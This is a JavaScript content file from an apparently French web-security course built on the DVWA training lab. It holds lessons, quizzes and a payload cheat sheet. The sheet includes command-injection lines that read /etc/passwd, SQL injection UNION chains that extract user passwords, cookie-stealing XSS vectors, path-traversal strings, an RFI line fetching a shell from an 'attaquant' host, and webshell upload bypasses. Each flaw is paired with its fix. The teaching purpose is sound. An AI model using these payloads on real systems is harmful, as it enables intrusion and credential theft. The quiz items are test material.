        legende: "Requête paramétrée (la vraie parade)",
        attention: "Masquer les messages d'erreur ne corrige rien : l'injection aveugle fonctionne sans eux."
      },

      { type: "partie", titre: "XSS (Cross-Site Scripting)", texte: "Faille de **sortie** : une entrée non échappée est réaffichée et le navigateur l'exécute comme du code." },
      {
        titre: "Exploiter",
        tableau: {
          entetes: ["Variante", "Idée", "Payload"],
          lignes: [
            ["Réfléchie", "Renvoyée dans la réponse immédiate (lien piégé)", "`<script>alert(document.cookie)</script>`"],
            ["Stockée", "Enregistrée en base, servie à tous", "même payload dans un commentaire / livre d'or"],
            ["Filtre medium", "`<script>` bloqué → autre balise", "`<img src=x onerror=alert(1)>`"]
          ]
        }
      },
      {
        titre: "Corriger",
        texte: "**Échapper la sortie** selon le contexte : `htmlspecialchars()` transforme `<` `>` `\"` `&`. Ajouter une **Content-Security-Policy** pour restreindre les scripts.",
        attention: "Les requêtes préparées ne protègent PAS de la XSS (ce n'est pas du SQL) : la XSS se corrige à l'affichage."
      },

      { type: "partie", titre: "Inclusion de fichiers, upload, CSRF", texte: "Trois familles fréquentes, chacune avec sa correction par liste blanche ou jeton." },
      {
        titre: "Inclusion de fichiers (LFI / RFI)",
        texte: "Un paramètre `page` passé à `include()`. **LFI** lit un fichier local, **RFI** un fichier distant.",
        tableau: {
          entetes: ["But", "Payload"],
          lignes: [
            ["Lire un fichier", "`?page=../../../../etc/passwd`"],
            ["Lire le code source", "`?page=php://filter/convert.base64-encode/resource=index.php`"],
            ["Contourner medium", "`....//` (survit à `str_replace('../','')`), `HtTp://`"]
          ]
        },
        remarque: "Correction : **liste blanche** des pages autorisées (jamais un chemin composé par l'utilisateur)."
      },
      {
        titre: "Upload de fichiers",
        texte: "Objectif attaquant : téléverser un **webshell** PHP exécutable.",
        code: WEBSHELL,
        legende: "Webshell minimal (démonstration)",
        points: [
          "**medium** ne vérifie que le type MIME → falsifier `Content-Type: image/jpeg`.",
          "**high** vérifie extension + `getimagesize()` → `shell.php.jpg` + octets magiques d'image.",
          "**Correction** : liste blanche d'extensions, `getimagesize`, **renommage**, stockage **hors racine web**, dossier non exécutable."
        ]
      },
      {
        titre: "CSRF",
        texte: "Faire exécuter au navigateur d'une victime **authentifiée** une requête non voulue (ex. changer son mot de passe via un lien/formulaire piégé).",
        remarque: "Correction : **jeton anti-CSRF** imprévisible et vérifié côté serveur, + cookie `SameSite`."
      }
    ]
  };

  /* =========================================================
     GUIDE 2 — Fiche technique des payloads
     ========================================================= */
  const guidePayloads = {
    id: "payloads-dvwa",
    titre: "Fiche technique — Payloads DVWA",
    badge: "Fiche technique",
    resume: "Les payloads prêts à l'emploi, sans théorie : séparateurs de shell, briques d'injection SQL (UNION et aveugle), vecteurs XSS, chemins d'inclusion. Un tableau par faille.",
    niveau: "Référence",
    sections: [
      { type: "partie", titre: "Injection de commandes", texte: "Enchaîner une commande après le `ping`." },
      {
        titre: "Séparateurs de shell",
        tableau: {
          entetes: ["Séparateur", "Effet"],
          lignes: [
            ["`;`", "Enchaîne inconditionnellement"],
            ["`|`", "Redirige la sortie vers la commande suivante"],
            ["`&&` / `||`", "Enchaîne si succès / si échec"],
            ["`&`", "Lance en arrière-plan"],
            ["`` `cmd` `` / `$(cmd)`", "Substitution : exécute puis insère le résultat"]
          ]
        },
        codes: [
          { code: "127.0.0.1; cat /etc/passwd", legende: "low" },
          { code: "127.0.0.1 | cat /etc/passwd", legende: "medium (| non filtré)" },
          { code: "127.0.0.1|cat /etc/passwd", legende: "high (pipe collé)" }
        ]
      },

      { type: "partie", titre: "Injection SQL — UNION", texte: "Extraction quand le résultat s'affiche à l'écran." },
      {
        titre: "Briques d'injection",
        tableau: {
          entetes: ["But", "Payload"],
          lignes: [
            ["Confirmer", "`1' OR '1'='1`"],
            ["Compter les colonnes", "`1' ORDER BY 2 #`"],
            ["Afficher", "`1' UNION SELECT 1,2 #`"],
            ["Version / utilisateur", "`1' UNION SELECT user(),version() #`"],
            ["Base courante", "`1' UNION SELECT database(),2 #`"],
            ["Tables", "`1' UNION SELECT table_name,table_schema FROM information_schema.tables #`"],
            ["Colonnes de users", "`1' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users' #`"],
            ["Extraire", "`1' UNION SELECT user,password FROM users #`"]
          ]
        },
        remarque: "Commentaires de fin : `#` ou `-- ` (l'espace après `--` est obligatoire)."
      },
      {
        titre: "Injection SQL — aveugle",
        tableau: {
          entetes: ["Type", "Payload"],
          lignes: [
            ["Booléenne vraie", "`1' AND 1=1 #`"],
            ["Booléenne fausse", "`1' AND 1=2 #`"],
            ["Temporelle", "`1' AND SLEEP(5) #`"],
            ["Extraction 1 caractère", "`1' AND SUBSTRING(version(),1,1)='1' #`"]
          ]
        },
        remarque: "En medium (contexte numérique), retirer les apostrophes : `1 AND 1=1`, `1 UNION SELECT ...`."
      },

      { type: "partie", titre: "XSS", texte: "S'exécute dans le navigateur." },
      {
        titre: "Vecteurs",
        tableau: {
          entetes: ["Situation", "Payload"],
          lignes: [
            ["Preuve", "`<script>alert(document.cookie)</script>`"],
            ["`<script>` filtré", "`<img src=x onerror=alert(1)>`"],
            ["Attribut / sans script", "`<svg onload=alert(1)>`"],
            ["Casse contournée", "`<ScRiPt>alert(1)</ScRiPt>`"]
          ]
        }
      },

      { type: "partie", titre: "Inclusion de fichiers", texte: "Paramètre passé à include()." },
      {
        titre: "Chemins",
        tableau: {
          entetes: ["But", "Payload"],
          lignes: [
            ["Traversée", "`../../../../etc/passwd`"],
            ["Code source encodé", "`php://filter/convert.base64-encode/resource=index.php`"],
            ["Contourner `../` filtré", "`....//....//etc/passwd`"],
            ["RFI (si allow_url_include)", "`http://attaquant/shell.txt`"]
          ]
        },
        attention: "Payloads à n'utiliser que sur VOTRE DVWA. Hors labo autorisé, c'est illégal."
      }
    ]
  };

  /* =========================================================
     Déclaration de la matière
     ========================================================= */
  CONTENU["securite-web"] = {
    guides: [guideMethodo, guidePayloads],
    chapitres: [
      {
        id: "bases",
        titre: "Chapitre 1 — Bases et cadre",
        description: "Ce qu'est DVWA, les niveaux de sécurité, le principe commun des injections et la légalité.",
        exercices: [
          {
            type: "qcm",
            id: "web-notions",
            titre: "QCM — Notions et cadre",
            description: "DVWA, niveaux de sécurité, principe des injections, liste blanche vs liste noire, légalité.",
            cours: [
              "À retenir avant tout :",
              [
                "**DVWA** : appli volontairement vulnérable, en **local**, pour s'entraîner légalement.",
                "**Niveaux** low → medium → high → **impossible** (le code corrigé).",
                "**Injection** = données utilisateur interprétées comme du **code**. Parade : séparer code et données.",
                "**Liste blanche** (autoriser le prévu) > **liste noire** (interdire quelques caractères), toujours contournable.",
                "**Légalité** : uniquement sur SA cible, avec autorisation."
              ]
            ],
            melangerChoix: true,
            questions: notions
          }
        ]
      },
      {
        id: "injection-commandes",
        titre: "Chapitre 2 — Injection de commandes",
        description: "Séparateurs de shell, contournement des listes noires low/medium/high, et correction par liste blanche.",
        exercices: [
          {
            type: "qcm",
            id: "web-cmd-qcm",
            titre: "QCM — Injection de commandes",
            description: "Séparateurs de shell, niveaux de filtrage, droits d'exécution et correction.",
            cours: [
              "Mini-rappel :",
              [
                "Le champ lance `ping <saisie>` ; on greffe une commande via `;` `|` `&&` `&`.",
                "**low** : rien de filtré. **medium** : `;` et `&&` retirés → utiliser `|`. **high** : `'| '` retiré → **pipe collé** `|cmd`.",
                "La commande tourne sous le compte du **serveur web** (www-data).",
                "**Correction** : éviter le shell, sinon liste blanche + `escapeshellarg()`."
              ]
            ],
            tirage: 8,
            melangerChoix: true,
            questions: cmdTheorie
          },
          {
            type: "terminal",
            id: "web-cmd-terminal",
            titre: "Terminal — Injection de commandes",
            description: "Injectez dans le champ « ping » de DVWA, du niveau low au high (contournement de liste noire).",
            terminal: "DVWA — Command Injection",
            invite: "ping — IP>",
            cours: [
              "Tapez ce que vous mettriez dans le **champ IP** de DVWA. La sortie du serveur s'affiche quand l'injection réussit.",
              ["`help` — un indice", "`solution` — le payload (hors score)", "`objective` — rappel de l'objectif", "`clear` — vider l'écran"]
            ],
            intro: [
              "Test **autorisé** sur **votre** DVWA local. Le champ exécute `ping <votre saisie>`.",
              "Montez les niveaux : low (aucun filtre), medium (`;`/`&&` retirés), high (`'| '` retiré)."
            ],
            objectifs: cmdObjectifs
          }
        ]
      },
      {
        id: "injection-sql",
        titre: "Chapitre 3 — Injection SQL",
        description: "Méthode UNION (confirmer, compter, cartographier, extraire), injection aveugle, et correction par requêtes préparées.",
        exercices: [
          {
            type: "qcm",
            id: "web-sql-qcm",
            titre: "QCM — Injection SQL",
            description: "OR 1=1, ORDER BY, UNION SELECT, information_schema, injection aveugle et requêtes préparées.",
            cours: [
              "Mini-rappel — la chaîne UNION :",
              [
                "**Confirmer** `1' OR '1'='1` → **compter** `1' ORDER BY n #` → **afficher** `1' UNION SELECT 1,2 #`.",
                "**Cartographier** via `information_schema.tables` / `.columns`, puis **extraire** `... user,password FROM users #`.",
                "**Aveugle** : `AND 1=1` vs `AND 1=2` (booléen) ou `AND SLEEP(5)` (temporel).",
                "**Correction** : **requêtes préparées** (données séparées du code). Masquer l'erreur ne suffit pas."
              ]
            ],
            tirage: 10,
            melangerChoix: true,
            questions: sqlBanque
          },
          {
            type: "terminal",
            id: "web-sql-terminal",
            titre: "Terminal — Injection SQL (UNION + aveugle)",
            description: "Menez l'extraction de bout en bout dans le champ « User ID » : confirmer, compter les colonnes, cartographier, extraire, puis prouver l'injection aveugle.",
            terminal: "DVWA — SQL Injection",
            invite: "User ID>",
            cours: [
              "Tapez ce que vous mettriez dans le champ **User ID**. La requête est `... WHERE user_id='<saisie>'`.",
              ["`help` — un indice", "`solution` — le payload (hors score)", "`objective` — rappel de l'objectif", "`clear` — vider l'écran"]
            ],
            intro: [
              "Test **autorisé** sur **votre** DVWA local, niveau low.",
              "Suivez la méthode UNION dans l'ordre, puis terminez par une injection **aveugle** temporelle."
            ],
            objectifs: sqlObjectifs
          }
        ]
      },
      {
        id: "xss-inclusion-csrf",
        titre: "Chapitre 4 — XSS, inclusion, upload, CSRF",
        description: "Les autres grandes failles de DVWA et leur correction (échappement de sortie, liste blanche, jeton anti-CSRF).",
        exercices: [
          {
            type: "qcm",
            id: "web-autres-qcm",
            titre: "QCM — XSS, inclusion, upload, CSRF",
            description: "XSS réfléchie/stockée, LFI/RFI, upload de webshell, CSRF, force brute et leurs parades.",
            cours: [
              "Mini-rappel — chaque faille, sa parade :",
              [
                "**XSS** (JS chez la victime) → **échapper la sortie** (`htmlspecialchars`) + CSP.",
                "**Inclusion** LFI/RFI → **liste blanche** des pages.",
                "**Upload** de webshell → liste blanche d'extensions, `getimagesize`, renommage, hors webroot.",
                "**CSRF** → **jeton anti-CSRF** + cookie `SameSite`.",
                "**Force brute** → limitation, verrouillage, MFA, CAPTCHA."
              ]
            ],
            tirage: 10,
            melangerChoix: true,
            questions: autresBanque
          },
          {
            type: "jetpunk",
            id: "web-faille-parade",
            titre: "Chaque faille et sa parade",
            consigne: "Nommez la faille décrite, ou la parade attendue, sur chaque tuile.",
            temps: 150,
            colonnes: 2,
            melanger: true,
            tirage: 8,
            items: [
              { indice: "Injecter du JavaScript exécuté chez d'autres utilisateurs", reponse: "XSS", alt: ["cross-site scripting", "cross site scripting"] },
              { indice: "Détourner une requête SQL via une entrée concaténée", reponse: "injection SQL", alt: ["sqli", "injection sql", "sql injection"] },
              { indice: "Exécuter des commandes système via un champ passé au shell", reponse: "injection de commandes", alt: ["command injection", "injection de commande"] },
              { indice: "Inclure un fichier du serveur via un paramètre (../../etc/passwd)", reponse: "LFI", alt: ["inclusion de fichier locale", "local file inclusion"] },
              { indice: "Faire agir le navigateur d'une victime authentifiée à son insu", reponse: "CSRF", alt: ["cross-site request forgery", "cross site request forgery"] },
              { indice: "Parade de fond contre l'injection SQL", reponse: "requêtes préparées", alt: ["requete preparee", "requetes preparees", "requête préparée", "prepared statements", "parametrage", "requêtes paramétrées"] },
              { indice: "Parade contre la XSS (à l'affichage)", reponse: "échappement de sortie", alt: ["htmlspecialchars", "encodage de sortie", "echappement", "échappement", "output encoding"] },
              { indice: "Parade contre la CSRF", reponse: "jeton anti-CSRF", alt: ["jeton csrf", "token csrf", "anti-csrf", "csrf token"] },
              { indice: "Autoriser seulement les valeurs prévues plutôt qu'interdire quelques caractères", reponse: "liste blanche", alt: ["whitelist", "allowlist"] },
              { indice: "Tester des milliers de mots de passe sur un formulaire de connexion", reponse: "force brute", alt: ["brute force", "bruteforce"] }
            ]
          }
        ]
      }
    ]
  };

})();
